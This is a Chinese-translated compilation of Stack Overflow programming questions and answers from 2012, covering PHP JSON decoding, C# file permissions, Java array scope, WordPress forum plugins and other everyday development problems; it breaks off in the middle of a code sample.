> 时间：2015-10-09T14:31:40.037

这肯定会帮助你。

```
int n[] = {4,6,9,1,7};

    for(int i=n.length;i>=0;i--){
        for(int j=0;j<n.length-1;j++){
            if(n[j] > n[j+1]){
                swapNumbers(j,j+1,n);
            }
        }

    }
    printNumbers(n);
}
private static void swapNumbers(int i, int j, int[] array) {

    int temp;
    temp = array[i];
    array[i] = array[j];
    array[j] = temp;
}

private static void printNumbers(int[] input) {

    for (int i = 0; i < input.length; i++) {
        System.out.print(input[i] + ", ");
    }
    System.out.println("\n");
} 
```**

# wordpress - 使用 Disqus 作为 Wordpress 中的传统论坛 = 强大的组合

> ID：13548620
> 
> 赞同：6
> 
> 时间：2012-11-25T05:35:25.220
> 
> 标签：wordpress, forum, disqus

我还没有找到一个好的讨论系统，它结合了论坛的力量和线程的活力和便利性，像 Disqus/Slashdot/Reddit 这样的动态评论系统。

我想在 wordpress 中使用 Disqus 创建一个讨论系统，该系统用作前端的传统论坛，用户可以在其中创建新的类别和子类别，这些类别和子类别又根据最后的回复按降序排列。目前我正在尝试将 Disqus 与 bbPress + Threaded 评论进行比较。

我确实找到了关于 stackoverflow的[先前讨论，它提供了一个指向](https://stackoverflow.com/questions/4578314/creating-a-website-forum-discussion-group-with-disqus)[disqus forums 的 API](http://disqus.com/api/docs/forums/)的链接。

但我似乎找不到使用它的网站的简单示例。在开始将它集成到我的网站之前，我真的很想看看它的使用情况！有谁知道一个例子？

此外，论坛 API 会做我想做的事吗？看起来 listThreads 可能会接近，但不清楚“帖子”和“线程”之间的区别是什么。此外，虽然论坛有一个*创建*选项和一个*listCategories*选项，但不清楚如何首先创建类别和子类别。同样，如果我有一个例子可以看，一切都会很清楚。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T23:25:53.873

Channels 是一个 Python 示例，说明如果由 Disqus 提供支持，迷你论坛将如何编码。

GitHub 仓库：[https ://github.com/disqus/channels](https://github.com/disqus/channels)

演示：[https ://pycon.disqus.com/](https://pycon.disqus.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T09:14:25.623

我建议您使用带有[bbPress Threaded Replies](http://wordpress.org/extend/plugins/bbpress-threaded-replies/)插件的 wordpress 的[bbPress](http://bbpress.org/)论坛插件。

# android - 在 Android 环境中不显示工具栏

> ID：13548621
> 
> 赞同：2
> 
> 时间：2012-11-25T05:35:30.133
> 
> 标签：android, jsf, primefaces, editor, cleditor

我对 primefaces 编辑器有疑问。它在我的 chrome 和 IE 上运行流畅

![在此处输入图像描述](../Images/776887d5cb76df2b078e0ecb080a5b55.png)

但是，当我在 localhost 上连接到我的网络时，它不会在我的 android 模拟器上显示它的控件。

![在此处输入图像描述](../Images/1b1e0c1a1e6b4e37c1bf916de8a265e8.png)

这是我的代码

```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:h="http://java.sun.com/jsf/html"
      xmlns:f="http://java.sun.com/jsf/core"
      xmlns:p="http://primefaces.prime.com.tr/ui">
    <h:head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" ></meta>

        <title>Piccolo Theme</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"></meta>

        <link href='http://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'></link>
        <link rel="stylesheet" href="css/bootstrap.css"></link>
        <link rel="stylesheet" href="css/bootstrap-responsive.css"></link>
        <link rel="stylesheet" href="css/jquery.lightbox-0.5.html"></link>
        <link rel="stylesheet" href="css/custom-styles.css"></link>

        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
            <link rel="stylesheet" href="css/style-ie.css"/>
        <![endif]-->

        <link rel="shortcut icon" href="img/favicon.ico"></link>
        <link rel="apple-touch-icon" href="img/apple-touch-icon.png"></link>
        <link rel="apple-touch-icon" sizes="72x72" href="img/apple-touch-icon-72x72.png"></link>
        <link rel="apple-touch-icon" sizes="114x114" href="img/apple-touch-icon-114x114.png"></link>

        <h:outputScript library="js" name="bootstrap.js"/>

        <h:outputScript library="primefaces" name="jquery/jquery.js" />
       <!-- <script src="js/jquery.custom.js"></script>-->

    </h:head>

    <h:body>
        <div align="center">
            <h:form rendered="#{userSession.isLogin}">

                You are #{userSession.username}
                <br/>

                Article header: <h:inputText  value="#{userSession.updateArticleTitle}"></h:inputText><br/>

                Article content:<br/>

                <p:editor  width="800" height="800" value="#{userSession.updateArticleContent}"></p:editor><br/>
                <h:commandButton value="Update Article" action="#{userSession.doUpdateArticle}" >
                    <f:param name="articledate" value="#{userSession.updateDate}"></f:param>
                </h:commandButton>
            </h:form>
            <h:form rendered="#{!userSession.isLogin}">
                Please login first !
                <h:link value="Return home" outcome="HomePage"></h:link>
            </h:form>
        </div>

    </h:body>
</html> 
```

谁能解释一下？我的 p:calendar 在 web 和 android 模拟器上都可以正常工作，但 p:editor 不能:(

# php - json解码成数组

> ID：13548627
> 
> 赞同：1
> 
> 时间：2012-11-25T05:36:42.520
> 
> 标签：php, json

我正在尝试将标题存储在一个数组中，并从下面的 url 中提取长 cmcontinue 字符串。

[http://en.wikipedia.org/w/api.php?action=query&list=categorymembers&cmtitle=Category:1980_births&format=json](http://en.wikipedia.org/w/api.php?action=query&list=categorymembers&cmtitle=Category:1980_births&format=json)

我当前的代码：

```
$url = 'http://en.wikipedia.org/w/api.php?
action=query&list=categorymembers&cmtitle=Category:'.$cat.'&format=json';

$ch = curl_init($url);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "asdf");

$c = curl_exec($ch);
$json = json_decode($c);

$array = $json->{'query'}->{'categorymembers'}->{'title'}; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-25T06:00:02.073

尝试添加[json_decode](http://php.net/manual/en/function.json-decode.php)的第二个参数，例如：

```
$json = json_decode($c, true); 
```

并获得`cmcontinue`价值：

```
echo $json["query-continue"]["categorymembers"]["cmcontinue"]; 
```

对于`titles`：

```
$titles = array();
foreach($json["query"]["categorymembers"] as $vals) {
    array_push($titles, $vals["title"]);
}

echo "<pre>"; print_r($titles); 
```

# windows-phone-7 - 我可以将我的 Windows Phone 7 应用程序升级到 WP8 并在商店中同时拥有这两个应用程序吗？

> ID：13548629
> 
> 赞同：3
> 
> 时间：2012-11-25T05:37:09.933
> 
> 标签：windows-phone-7, windows-phone, windows-phone-8

我在 Windows Phone 商店中有一些支持 Windows Phone 7 的应用程序。我想升级它们以支持 Windows Phone 8，但这是否会使使用 WP7 的用户无法购买/重新安装应用程序？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-25T15:09:44.287

DevCenter 支持同一应用程序的多个 XAP。所以应用程序可以有一个用于 WP7 的 XAP 和一个或多个用于 WP8 的 XAP。我已经在这里充分解释了这个问题@[如何让我的 Windows Phone 7 应用程序出现在 Windows Phone 8 市场中？](https://stackoverflow.com/questions/13431951/how-do-i-get-my-windows-phone-7-app-to-show-up-in-the-windows-phone-8-marketplac/13475744#13475744)

这是一个打印屏幕，演示了 DevCenter 支持在不同平台版本和不同分辨率上为同一应用程序提交多个 XAP： ![DevCenter 多 XAP 支持](../Images/98c4a3c6858e188932941de7823a24ad.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T09:39:47.023

DevCenter 允许您推送两个版本的应用程序：一个用于 WP8 用户，一个用于旧版 WP7 用户。这样，您的 WP7 用户可以继续使用该应用程序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-25T10:34:49.677

您应该为 WP7 创建“最新版本”并将您的解决方案更新到 WP8，提交 WP8 版本并仅更新这个版本，或者创建第二个 WP8 项目，添加原始解决方案中所有文件的链接并维护 WP7.5 和 WP8同时版本。
Windows Phone Store 允许您为 WP7.5 提交一个版本，为 WP8 提交一个版本，因此您可以不断更新这两个版本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-27T15:48:57.350

事实上，我有一个应用程序可用作 WP7 的 v1.3、WP7.1 (Mango) 的 v1.5 和 WP8 的 v1.6。这并不是说我不能在所有平台上都使用相同的版本，但我一直很“刻薄”，并且要求我的应用程序的最新版本需要最新的操作系统版本。

# java - 如何在启动时将 Maven 作为守护进程或独立运行

> ID：13548635
> 
> 赞同：2
> 
> 时间：2012-11-25T05:38:50.613
> 
> 标签：java, linux, maven, jetty, resteasy

我的服务器启动后如何运行 Maven？服务器运行后可以使用 cron 执行脚本吗？或者这是一个不好的做法？我正在使用 Jetty 和 Resteasy 并在 Maven 上运行它们来启动我的网络服务器。

当我的服务器启动时，Maven 自动启动的最佳解决方案是什么？使用的命令是：

```
mvn jetty:run -e 
```

编辑：我正在使用 Amazon EC2 启动一个实例，我希望在启动实例后立即运行 maven 构建。Maven 构建并运行 Resteasy、Jetty 和 pom.xml 文件中规定的其他一些依赖项。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:34:16.077

您可以使用特定于操作系统的初始化脚本方法。可以在[这里](https://stackoverflow.com/q/8339555/1059840)找到一个非常好的 Ubuntu OS 答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T21:52:54.420

通常，您将 Maven 用作构建工具，而不是部署工具。

你想达到什么目的？如果您只想启动 Jetty，它带有自己的初始化脚本，如果您启用它们，它将在启动时启动它们。

除非有令人信服的理由为此使用 Maven，否则我会让您的 Maven 构建过程创建一个“可执行单元”，例如可执行 JAR、WAR 等，然后在启动时启动它。

# php - 将会话状态保存为唯一 url 以与他人共享

> ID：13548637
> 
> 赞同：3
> 
> 时间：2012-11-25T05:39:25.137
> 
> 标签：php, mysql, session, hash

我正在使用会话将项目存储在用户愿望列表中。

愿望清单存储为一个简单的唯一项目 id 数组 - 普通用户会在愿望清单中存储大约 40 个项目，但用户可能希望在他们的愿望清单中添加多达几百个项目。

我想生成一个唯一的 URL，以便他们以后可以重新访问他们的愿望清单，或者与其他可以将其用作自己的清单起点的人共享愿望清单。

我没有从用户那里收集任何数据，他们也没有账户来链接他们的愿望清单数据。

我正在考虑的两种处理方法是：

将数据存储为 URL 末尾的哈希，可以是 url 编码的序列化字符串或 base64 编码的字符串。这似乎更可取，因为我不需要存储心愿单，这为用户修改现有列表提供了很大的灵活性，但是我怀疑如果心愿单中的项目数量增加并且 URL 长度超过可操作的字符数。

或者

生成具有唯一 ID 的 url 并将愿望清单保存到数据库中。我看到的问题是每次用户希望生成 URL 时都会向数据库添加一个新条目，并且由于这些条目不会与任何一个用户绑定，因此每次都需要生成一个新条目用户对列表进行任何修改的时间。

是否有另一种更好的方法来处理这个问题，或者有一种方法来管理与上述方法相关的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:51:22.450

我认为从长远来看，走数据库路线将是最灵活的解决方案。只要您的数据建模良好，每次用户进行选择时添加/删除记录不应该成为问题。“选择”应该创建不超过键引用两件事的记录；一个用户，一个产品加上数量和价格。

也就是说，我会使用类似于以下的模型：

*   产品（id，...）
*   selection_set (id, name)
*   选择（product_id、selection_set_id、数量、价格）
*   愿望清单（public_hash，selection_set_id）

Wishlist 与 selection_set 是分开的，因为您可以将 selection_set 重用于其他事物，例如购物车或订单。

完成后，您可以将 public_hash 存储在 cookie/会话中，并给他们一个链接到的 url。

这适用于您想到的场景吗？还是有任何额外的限制？

**替代解决方案：**

尽管我认为数据库是一个可行的解决方案，但我可以想到几个替代方案：

**压缩和编码数据：**

> 您可以使用逗号分隔的愿望清单项目 ID 列表（或某种唯一标识符），然后使用 base64_encode( gzinflate( $list ) ) 并将其用作您的哈希。然后，您可以使用 gzdeflate( base64_decode( $hash ) ) 来获取您的项目列表。为了避免在每次页面加载时执行此操作，您可以继续在会话中存储您的选择，并且仅在列表更改时重新生成哈希。

gzdeflate + base64 应该将您的哈希值保持在合理的长度内，以便进行非常大的愿望清单选择。您可以编写一些单元测试来查看哈希/列表可以假设多长时间。

这种方法感觉就像一个彻底的黑客:-)

**使用[Redis](http://redis.io/)：**

您可以设置一个 redis 服务器并在其上存储愿望清单。它将是持久的、可扩展的、快速且易于访问的。

# c# - C# 从 QueryString 反序列化复杂对象

> ID：13548640
> 
> 赞同：2
> 
> 时间：2012-11-25T05:40:14.467
> 
> 标签：c#, asp.net, arrays, query-string, deserialization

我被迫使用`GET`请求将复杂对象传递给我的应用程序。

如何反序列化这样的查询字符串：

```
?people[andy]=12&people[bob]=43&people[charlie]=53&items=89&items=123&x=zulu 
```

变成这样的自定义对象？

```
public class myClass {
    public Dictionary<string, int> people { get; set; }
    public int[] items { get; set; }
    public string x { get; set; }
} 
```

`&`除了拆分并循环遍历结果以手动设置每个值之外，还有更好（更复杂）的方法吗？

任何指针/指导将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:50:59.270

如果您可以控制应用程序的发送端，我强烈建议您使用不同的编码方法来简化解析。我只会对整个对象进行 JSON 编码，然后对 JSON 进行 URIencode（如果它必须在 query_string 中）。

包括 query_string 在内的 URI 的大小通常有相当小的限制（大约 2K 个字符）。如果您被迫使用 HTTP，取决于您的用例以及您是否可以控制它，POST 可能更可取。

有关反序列化JSON 的一些方法，请参阅此问题： [C# deserialize dynamic JSON](https://stackoverflow.com/questions/13504805/c-sharp-deserialize-dynamic-json/13504951#13504951)

# html - CSS 打印：奇数表 TD 间距问题

> ID：13548641
> 
> 赞同：1
> 
> 时间：2012-11-25T05:40:25.013
> 
> 标签：html, css, printing

我的这个页面看起来不错，但似乎打印不正确。当我使用 Web 开发人员扩展程序（用于 Firefox 的 chrome）并预览打印样式表时，它似乎没问题。但是打印它和/或使用打印预览会产生不同的结果。某些表格行之间似乎有很大的差距？

问题页面 [http://wearnewzealand.com/fashion-catalogue](http://wearnewzealand.com/fashion-catalogue)

任何建议将不胜感激。

# java - Java方法返回空指针？

> ID：13548645
> 
> 赞同：0
> 
> 时间：2012-11-25T05:40:48.303
> 
> 标签：java

所以我有一个在用户运行命令时检查的方法，我得到这个糟糕的错误，它返回一个 NullPointer ...

这是我的方法，

```
 public boolean openReferal(String name) {
    for(String s : m.refferalSessions) {
        if(s.equalsIgnoreCase(name)) {
            return true;
        }
    }
    return false;
} 
```

这就是我如何实施它......

```
 if(check.openReferal(sender.getName() + ":" + args[0])) {
            sender.sendMessage(openReferal);
            return true;
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:45:42.267

A`NullPointerException`表示您在某处取消引用空变量。堆栈跟踪将准确告诉您是哪一行导致了问题，并且您可以从中推断出哪个变量设置为空。

从您的代码中，只有几个嫌疑人：`m`、`m.referralSessions`和. 检查它们是否都已正确初始化，并使用异常中的信息来帮助追踪问题。`check``sender`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:46:13.963

在实践中，方法不会返回 NullPointerExceptions；相反，他们扔掉它们。但是，方法可以返回`null`。

但是，布尔方法*不能*返回 null，因为原语不能为 null。此处的 NullPointerException 可能是您在它们上调用相应方法时的结果`sender` 或为 null。`check`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T05:48:47.197

`s`可能为空。

您可以进行调试以查看`s`.

# arrays - 在 AS3 中为 2D 平台游戏产生新关卡的问题

> ID：13548646
> 
> 赞同：1
> 
> 时间：2012-11-25T05:41:00.263
> 
> 标签：arrays, actionscript-3, levels

我正在为一个项目在 Flash 中制作一个 2D 平台游戏，一切都很顺利！在我意识到作业说要使用 2 个级别之前，一直很容易向上航行，而我完成级别的唯一方法是将它们添加为类，而这个项目正在使用数组。

我开始使用 URLLoader 在 .txt 文件中添加关卡，但即便如此，我一直在关注的示例代码也只显示了如何为一个关卡执行此操作，而不是为 2+ 个关卡。

这是我用于地图的代码，如果这还不够，我可以提供更多：

```
 public function init()
    {
        trace("init");

        map = [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
                [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
                [0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 2, 2, 2, 0, 0, 0, 0],
                [0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 2, 2, 2, 0, 0, 0, 0],
                [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0],
                [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
                [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
                [0, 1, 1, 1, 0, 2, 2, 0, 1, 1, 1, 1, 0, 2, 2, 0, 1, 1, 1, 0],
                [0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0],
                [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
                [0, 0, 0, 0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 0, 0, 0]]

                container = new Sprite();
                addChild(container);
                tileArray = [Tile0, Tile1, Tile2];
                buildMap();
                createPlayer();
                createWinSpace();
                ArrowKeyInput.init(stage);
                addEventListener(Event.ENTER_FRAME, update);
    }
    private function buildMap():void
    {
        trace("BUILD");
        tileMap = [];
        for (var i:int = 0; i < map.length; i++) 
        {
            var row:Array = map[i];
            var tileRow:Array = [];
            tileMap.push(tileRow);
            for (var j:int = 0; j < row.length; j++) 
            {
                var tileNum:int = row[j];
                var className:Class = tileArray[tileNum];
                var tile:MovieClip = new className();
                tile.width = tile.height = TILE_SIZE;
                tile.x = TILE_SIZE * j;
                tile.y = TILE_SIZE * i;
                container.addChild(tile);
                tileRow.push(tile);
            }
        }
    } 
```

我很感激我能得到的任何反馈。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T03:01:28.930

如果我对您的理解正确，您想知道如何使您的 buildMap 函数能够构建多个地图。

关于这个问题，重要的是要理解地图数组是 buildMap 函数用作构建关卡的数据。因此，地图数组中的任何内容都定义了关卡上每个位置将使用哪些图块。因此，如果您想拥有多个级别，您可以定义多个地图，每个地图都有自己的数组：

```
 map_1 = [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 2, 2, 2, 0, 0, 0, 0],
            [0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 2, 2, 2, 0, 0, 0, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0],
            [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 1, 1, 1, 0, 2, 2, 0, 1, 1, 1, 1, 0, 2, 2, 0, 1, 1, 1, 0],
            [0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 0, 0, 0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 0, 0, 0]];

    map_2 = [[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 2, 2, 2, 0, 0, 0, 0],
            [0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 2, 2, 2, 0, 0, 0, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0],
            [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 1, 1, 1, 0, 2, 2, 0, 1, 1, 1, 1, 0, 2, 2, 0, 1, 1, 1, 0],
            [0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0],
            [0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0],
            [0, 0, 0, 0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 0, 0, 0, 0]]; 
```

这些是您的地图定义，您可以拥有任意数量的地图。我刚刚复制了第二张地图的数据，但您可以在该定义中创建一个新级别。

现在，在调用 buildMap() 函数之前，只需将 map 的值设置为您希望构建的任何级别：

```
map = map_1;
buildMap(); 
```

或者

```
map = map_2;
buildMap(); 
```

现在，您还有其他事情要考虑，就好像您从 map_1 开始然后想要构建 map_2，您需要移除用于构建 map_1 的图块。

从我在您的代码中可以看出，它们都已添加到容器精灵中。因此，您可以通过在 buildMap() 函数的开头添加类似这样的内容来删除所有这些图块：

```
while (container.numChildren > 0)
{
    container.removeChildAt(0);
} 
```

很可能还有其他变量需要在加载新关卡时进行重置，但这只是作为您可以管理的一种方式的示例，通过查看您的代码我知道的很少。

# ruby-on-rails - Rails 访问符号的当前值

> ID：13548647
> 
> 赞同：0
> 
> 时间：2012-11-25T05:41:16.523
> 
> 标签：ruby-on-rails, ruby

在 edit.html.erb 文件中，我有代码

```
<%= form_for @submission do |f| %>
  <%= f.fields_for :submitted_answers do |answer| %>
     <%= answer.label :question_id %>
     <%= answer.number_field :question_id %>
  <% end %>
<% end %> 
```

这向我显示了一个数字字段，它具有 question_id 的当前值并允许我更改它。现在我只想显示该值而不让任何人更改它。我将如何获得该值？

如果我说

```
<% @question = :question_id %> 
```

问题只等于一个字符串：“question_id”

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:51:45.020

你似乎误解了这里发生的事情。符号是类似于字符串的对象，但在内存中的存储方式不同，语法也不同。当您将符号传递给 Ruby 中的许多方法时，它们被用作对方法的引用。在这种情况下，`:question_id`符号作为参数传递给`number_field`辅助方法，随后在表单对象（即可能是 ActiveRecord 模型）上调用它。

长话短说，`answer`表单构建器从您传递给`form_for`调用的模型中获取问题 ID。要显示该值，您可以通过直接调用该方法来执行相同的操作，即：

```
<%= @submission.question_id %> 
```

但是，由于您正在使用 迭代这些`fields_for`对象，因此您可以通过调用来获取表单构建器正在引用的对象`object`：

```
<%= answer.object.question_id %> 
```

# excel - Excel VBA 用户窗体（通过列表框选择激活工作表）

> ID：13548650
> 
> 赞同：1
> 
> 时间：2012-11-25T05:41:45.697
> 
> 标签：excel, excel-2010, vba

我正在尝试一个很棒的功能，该功能显示一个列表框，该列表框充满了每个工作表上的所有形状。对于那件事我没有任何疑问。But I would like it when a shape is selected that the sheet, and shape is activate.

```
//Module(Custom)
Public Function getShape(Target As Variant) As Variant
    Dim ws As Worksheet   
    Dim sh As Shape
    Dim main As MainForm
    Set main = New MainForm
    For Each ws In ActiveWorkbook.Sheets
        For Each sh In ws.shapes
            main.AddShape sh, ws
        Next sh
    Next ws
    main.Show
End Function

//For MainForm
Dim shape_collection As Collection
Dim sheet_collection As Collection
Dim cnt As Integer

Private Sub ListBox1_Click()
    If ListBox1.ListIndex = -1 Then Exit Sub
    Dim ws As Worksheet
    Dim sh As Shape
    Set ws = sheet_collection.item(ListBox1.ListIndex + 1)
    Set sh = shape_collection.item(ListBox1.ListIndex + 1)
    Worksheets(ws.Name).Activate
    Worksheets(ws.Name).Select
    Worksheets(ws.Name).Visible = True
    sh.Select
End Sub

Private Sub UserForm_Initialize()
    Set shape_collection = New Collection
    Set sheet_collection = New Collection
End Sub

Public Sub AddShape(sh As Shape, ws As Worksheet)
    ListBox1.AddItem (sh.Name)
    shape_collection.Add sh
    sheet_collection.Add ws
End Sub 
```

# c# - 在 C# 中使用 TextWriter 写入文件时出现 UnauthorizedAccessException

> ID：13548652
> 
> 赞同：1
> 
> 时间：2012-11-25T05:42:28.670
> 
> 标签：c#, .net

我有一个错误说：

> “访问路径 'C:\Program Files (x86)\My Program\bin\Debug\myName.data' 被拒绝”

这是我的代码

```
TextWriter tw = new StreamWriter("bin\\Debug\\myName.data");

tw.Write(txtLoginName.Text);
tw.Close(); 
```

我已为我的所有项目文件授予完全控制权限。我制作了安装程序，以便客户将其安装在他们的电脑中，当检查文件时，我发现没有授予用户写访问权限。如何处理？

```
************** Exception Text **************
System.UnauthorizedAccessException: Access to the path 'C:\Program Files (x86)\My Program\bin\Debug\myName.data' is denied.
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy)
   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options)
   at System.IO.StreamWriter.CreateFile(String path, Boolean append)
   at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize)
   at System.IO.StreamWriter..ctor(String path)
   at clientChat.Form2.button1_Click(Object sender, EventArgs e)
   at System.Windows.Forms.Control.OnClick(EventArgs e)
   at System.Windows.Forms.Button.OnClick(EventArgs e)
   at System.Windows.Forms.Button.OnMouseUp(MouseEventArgs mevent)
   at System.Windows.Forms.Control.WmMouseUp(Message& m, MouseButtons button, Int32 clicks)
   at System.Windows.Forms.Control.WndProc(Message& m)
   at System.Windows.Forms.ButtonBase.WndProc(Message& m)
   at System.Windows.Forms.Button.WndProc(Message& m)
   at System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message& m)
   at System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message& m)
   at System.Windows.Forms.NativeWindow.Callback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:01:41.283

安装程序将在用户的登录上下文中运行，系统的普通用户无权写入 Program Files 或其他此类系统文件夹。

您需要将文件夹的位置移动到用户的应用数据文件夹。或者您的安装程序创建的其他一些常见位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T05:59:34.757

普通用户无法写入程序文件（以及系统文件夹中的其他位置） - 设计使然。

请使用文件夹或其他每个用户的位置来存储用户的数据。[Environment.GetFolderPath](http://msdn.microsoft.com/en-us/library/14tx8hby.aspx)可让您获取当前用户的正确位置，考虑哪个Environment.SpecialFolder[适合](http://msdn.microsoft.com/en-us/library/system.environment.specialfolder.aspx)您的情况并将其用作基本文件夹。

以下示例将给出“我的文档”文件夹中的路径：

```
var pathToFile = Path.Combine(
  Environment.GetFolderPath(Environment.SpecialFolder.Personal),
  "my_file_name.txt"); 
```

# java - 使数组在整个方法和类中都可以访问

> ID：13548654
> 
> 赞同：0
> 
> 时间：2012-11-25T05:42:48.013
> 
> 标签：java

如何使数组在整个类和方法中都可以访问？现在我有类似的东西

```
public class Class
{
public int[] array = new int[value];
public static int var;
    public void callArray()
    {            
        for(int x = 0; x < array.length; x++)
            var++;
        for(int x = 0; x < array.length; x++)
        {
            value[x] = var;
            var = 0;
        }
    }

    public void anotherMethod()
    {
    int[] array = new int[var];
         for(int x = 0; x < array.length; x++)
             System.out.println(array[x])
    }
}  
public class AnotherClass extends Class
{
int[] array = new int[var];
    for(int x = 0; x < array.length; x++)
        System.out.println(array[x]);
} 
```

每次我做这样的事情时，我都会得到一个空指针或数组越界我怎样才能使数组在多个类和方法中可用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T05:46:02.450

假设`array`是类的成员（*实例变量*） - 你应该使用它，而不是创建一个新的*局部变量*：

```
 int[] array = new int[value]; 
```

正在创建一个新的局部变量，并在其上“工作”，而不是在实例变量上工作。

你真正需要的是：

```
public void callArray() {
    array = new int[value];
    //^^ note that we do not declare a new variable, and thus we use the instance variable

    for(int x = 0; x < array.length; x++)
        //code
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T05:45:42.210

您需要使数组成为字段：

```
class MyClass {
    int[] array = new int[5];

    public void callArray()
    {
        for(int x = 0; x < array.length; x++)
            //code
    }

    public void anotherMethod()
    {
         for(int x = 0; x < array.length; x++)
             System.out.println(array[x])
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T05:56:34.187

如果您需要从许多不同的类实例对您的数组进行进程范围的访问，您可以将它包装在[单例](http://en.wikipedia.org/wiki/Singleton_pattern)类中。如果您只需要在实现“callArray”和“anotherMethod”方法的一个对象中访问数组，您可以简单地将数组声明为类字段：

```
public YourClass {
    private int[] array = new int[value];

    public void callArray()
    {
        for(int x = 0; x < array.length; x++)
            //code
    }

    public void anotherMethod()
    {
